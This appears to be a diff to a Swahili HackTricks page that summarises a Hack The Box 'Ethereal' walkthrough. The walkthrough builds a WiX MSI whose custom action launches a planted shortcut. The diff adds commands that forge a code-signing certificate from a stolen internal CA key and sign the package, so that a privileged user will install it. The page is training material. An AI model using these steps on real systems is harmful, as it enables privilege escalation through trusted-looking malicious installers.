@@ -1,12 +1,12 @@
-# Kuunda MSI Hasidi na Kupata Root
+# Kuunda MSI ya Custom-Action kwa WiX
 
 {{#include ../../banners/hacktricks-training.md}}
 
-Uundaji wa MSI installer utafanywa kwa kutumia wixtools, hasa [wixtools](http://wixtoolset.org) itatumika. Inafaa kutaja kwamba MSI builders mbadala zilijaribiwa, lakini hazikufaulu katika hali hii mahususi.<sup>[[1]](#references)</sup>
+Mlolongo huu wa kihistoria wa Hack The Box ulitumia WiX Toolset v3 kuunda MSI iliyozindua faili ya `.lnk` iliyokuwa imepandikizwa awali. **MSI haipewi privileges moja kwa moja**: utekelezaji hufanyika katika muktadha unaochaguliwa na sera ya Windows Installer, attributes za custom-action, na yeyote anayesakinisha. Katika scenario iliyotajwa, mshambulizi pia aliiba trusted signing CA na kuweka MSI iliyosainiwa kwenye folder iliyokuwa ikifuatiliwa na mtumiaji mwingine.<sup>[[1]](#references)[[3]](#references)</sup>
 
-Kwa uelewa wa kina wa mifano ya matumizi ya wix MSI, inashauriwa kushauriana na [ukurasa huu](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with). Hapa, unaweza kupata mifano mbalimbali inayoonyesha matumizi ya wix MSI.<sup>[[2]](#references)</sup>
+Kwa uelewa wa kina wa mifano ya matumizi ya wix MSI, inapendekezwa kushauriwa [this page](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with). Hapa, unaweza kupata mifano mbalimbali inayoonyesha matumizi ya wix MSI.<sup>[[2]](#references)</sup>
 
-Lengo ni kutengeneza MSI ambayo itatekeleza faili ya lnk. Ili kufanikisha hili, code ya XML ifuatayo inaweza kutumika ([xml kutoka hapa](https://0xrick.github.io/hack-the-box/ethereal/index.html#Creating-Malicious-msi-and-getting-root)):<sup>[[1]](#references)</sup>
+MSI inaendesha `C:\Users\Public\Desktop\Shortcuts\rick.lnk`. XML ya awali ya WiX v3 imehifadhiwa hapa chini:<sup>[[1]](#references)</sup>
 ```html
 <?xml version="1.0"?>
 <Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
@@ -38,25 +38,31 @@ fail_here
 </Product>
 </Wix>
 ```
-Ni muhimu kutambua kwamba Package element ina attributes kama vile InstallerVersion na Compressed, zinazobainisha toleo la installer na kuonyesha iwapo package imebanwa au la, mtawalia.
+`InstallerVersion` hutangaza kiwango cha chini cha Windows Installer, na `Compressed="yes"` huashiria kwamba package imebanwa. `Stage1` ni deferred lakini ina `Impersonate="yes"`, hivyo huendeshwa kwa impersonated token ya mtumiaji anayesakinisha; mabadiliko ya privilege katika hali hii yalitokana na mtumiaji mwenye privilege aliyefungua MSI baadaye, si kutokana na attribute hiyo kuipa SYSTEM kwa uchawi.<sup>[[3]](#references)</sup>
 
-Mchakato wa uundaji unahusisha kutumia candle.exe, tool kutoka wixtools, ili kutengeneza wixobject kutoka kwa msi.xml. Command ifuatayo inapaswa kutekelezwa:<sup>[[1]](#references)</sup>
+Compile source kuwa WiX object kwa kutumia `candle.exe`:<sup>[[1]](#references)</sup>
 ```
-candle.exe -out C:\tem\wix C:\tmp\Ethereal\msi.xml
+candle.exe -out C:\tmp\wix.wixobj C:\tmp\Ethereal\msi.xml
 ```
-Zaidi ya hayo, inafaa kutaja kwamba picha imewekwa kwenye chapisho, inayoonyesha command na output yake. Unaweza kuitumia kama mwongozo wa kuona.<sup>[[1]](#references)</sup>
-
-Vilevile, light.exe, tool nyingine kutoka wixtools, itatumika kuunda faili la MSI kutoka kwa wixobject. Command itakayotekelezwa ni ifuatayo:<sup>[[1]](#references)</sup>
+Unganisha object hiyo kwenye MSI kwa kutumia `light.exe`:<sup>[[1]](#references)</sup>
 ```
-light.exe -out C:\tm\Ethereal\rick.msi C:\tmp\wix
+light.exe -out C:\tmp\Ethereal\rick.msi C:\tmp\wix.wixobj
 ```
-Sawa na command ya awali, image imejumuishwa kwenye post inayoonyesha command na matokeo yake.<sup>[[1]](#references)</sup>
+### Hatua ya signing iliyotumika katika chain ya awali
 
-Tafadhali kumbuka kwamba ingawa muhtasari huu unalenga kutoa maelezo muhimu, inapendekezwa kurejelea post ya awali kwa maelezo ya kina zaidi na instructions sahihi.<sup>[[1]](#references)</sup>
+Workflow lengwa ilikubali packages zilizosainiwa na CA ya ndani iliyoathiriwa. Write-up ilitengeneza signing certificate kutoka kwa `MyCA.cer`/`MyCA.pvk` iliyopatikana, ikaunda PFX, na kusaini MSI:<sup>[[1]](#references)</sup>
+```powershell
+makecert.exe -n "CN=Ethereal" -pe -cy end `
+-ic C:\tmp\MyCA.cer -iv C:\tmp\MyCA.pvk -sky signature `
+-sv C:\tmp\rick.pvk C:\tmp\rick.cer
+pvk2pfx.exe -pvk C:\tmp\rick.pvk -spc C:\tmp\rick.cer -pfx C:\tmp\rick.pfx
+signtool.exe sign /f C:\tmp\rick.pfx C:\tmp\Ethereal\rick.msi
+```
+Mshambuliaji kisha aliweka kifurushi kilichotiwa sahihi katika `D:\DEV\MSIs` na kusubiri privileged workflow/user kukiendesha. Dumisha sharti hilo la awali unapobadilisha technique hii: bila elevated installation path, policy isiyo salama kama `AlwaysInstallElevated`, au privileged victim, kifurushi hiki hutekelezwa kwa rights za current user pekee.
 
-## Marejeo
+## References
 
-- [1] [Hack The Box - Ethereal: Creating Malicious msi and getting root - 0xRick's Blog](https://0xrick.github.io/hack-the-box/ethereal/#Creating-Malicious-msi-and-getting-root)
-- [2] [A quick introduction: Create an MSI installer with WiX - CodeProject](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with) (tazama pia [wixtools](http://wixtoolset.org))
-
+- [1] [Hack The Box - Ethereal: Kuunda msi hasidi na kupata root - Blogu ya 0xRick](https://0xrick.github.io/hack-the-box/ethereal/#Creating-Malicious-msi-and-getting-root)
+- [2] [Utangulizi mfupi: Kuunda MSI installer kwa kutumia WiX - CodeProject](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with) (see also [wixtools](http://wixtoolset.org))
+- [3] [Microsoft Learn — Deferred execution custom actions (`Impersonate`)](https://learn.microsoft.com/en-us/windows/win32/msi/custom-action-in-script-execution-options)
 {{#include ../../banners/hacktricks-training.md}}
